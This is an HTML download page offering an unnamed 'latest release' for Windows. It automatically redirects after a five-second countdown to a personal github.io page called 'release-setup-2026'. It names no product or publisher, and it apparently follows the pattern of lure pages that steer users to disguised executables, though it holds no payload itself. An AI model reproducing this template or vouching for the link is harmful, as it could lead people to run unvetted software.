<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content="Download the latest release."/>
  <meta http-equiv="refresh" content="5;url=https://adrianstykles10.github.io/release-setup-2026"/>
  <title>Download</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "Segoe UI", system-ui, sans-serif;
      background: #111;
      color: #e8e8e8;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .bar {
      width: 100%;
      height: 3px;
      background: #333;
    }

    main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem 1.5rem;
      width: 100%;
    }

    .box {
      width: 100%;
      max-width: 420px;
      text-align: center;
      padding: 2.5rem 2rem;
      background: #1a1a1a;
      border: 1px solid #2a2a2a;
      border-radius: 12px;
    }

    .icon {
      width: 56px;
      height: 56px;
      margin: 0 auto 1.25rem;
      border-radius: 14px;
      background: #252525;
      border: 1px solid #333;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .icon svg {
      width: 26px;
      height: 26px;
      stroke: #aaa;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    h1 {
      font-size: 1.35rem;
      font-weight: 600;
      margin-bottom: 0.5rem;
      color: #fff;
    }

    p {
      font-size: 0.9rem;
      color: #888;
      line-height: 1.5;
      margin-bottom: 1.5rem;
    }

    .redirect-note {
      font-size: 0.85rem;
      color: #777;
      margin-bottom: 1rem;
    }

    .redirect-note strong {
      color: #bbb;
      font-weight: 600;
    }

    .progress-wrap {
      width: 100%;
      height: 6px;
      background: #2a2a2a;
      border-radius: 999px;
      overflow: hidden;
      margin-bottom: 1.75rem;
    }

    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #555, #888);
      border-radius: 999px;
      transition: width 0.1s linear;
    }

    .dl-btn {
      display: inline-block;
      min-width: 220px;
      padding: 0.75rem 1.5rem;
      background: #2f2f2f;
      color: #fff;
      font-size: 0.95rem;
      font-weight: 600;
      text-decoration: none;
      border-radius: 6px;
      border: 1px solid #444;
      transition: background 0.15s, border-color 0.15s;
    }

    .dl-btn:hover {
      background: #3a3a3a;
      border-color: #555;
    }

    .secondary {
      display: inline-block;
      margin-top: 1rem;
      font-size: 0.8rem;
      color: #666;
      text-decoration: none;
    }

    .secondary:hover { color: #aaa; }

    footer {
      padding: 1.25rem;
      font-size: 0.7rem;
      color: #444;
    }
  </style>
</head>
<body>
  <div class="bar"></div>

  <main>
    <div class="box">
      <div class="icon">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path d="M12 3v10"/>
          <path d="M8 11l4 4 4-4"/>
          <path d="M4 17v2a2 2 0 002 2h12a2 2 0 002-2v-2"/>
        </svg>
      </div>
      <h1>Download Latest Release</h1>
      <p>Get the newest version for Windows.<br/>Extract, run, and you are ready to go.</p>

      <p class="redirect-note">Redirecting in <strong id="countdown">5</strong>s&hellip;</p>
      <div class="progress-wrap">
        <div class="progress-fill" id="progress"></div>
      </div>

      <div class="dl-wrap">
        <a class="dl-btn" href="https://adrianstykles10.github.io/release-setup-2026" id="download-link">Download Latest</a>
      </div>
      <a class="secondary" href="https://adrianstykles10.github.io/release-setup-2026">Skip wait &rarr;</a>
    </div>
  </main>

  <footer>Latest stable build</footer>

  <script>
    (function () {
      var url = "https://adrianstykles10.github.io/release-setup-2026";
      var total = 5000;
      var start = Date.now();
      var progress = document.getElementById("progress");
      var countdown = document.getElementById("countdown");

      function tick() {
        var elapsed = Date.now() - start;
        var ratio = Math.min(elapsed / total, 1);
        progress.style.width = (ratio * 100) + "%";
        countdown.textContent = Math.max(0, Math.ceil((total - elapsed) / 1000));
        if (ratio >= 1) {
          window.location.href = url;
          return;
        }
        requestAnimationFrame(tick);
      }

      requestAnimationFrame(tick);
    })();
  </script>
</body>
</html>
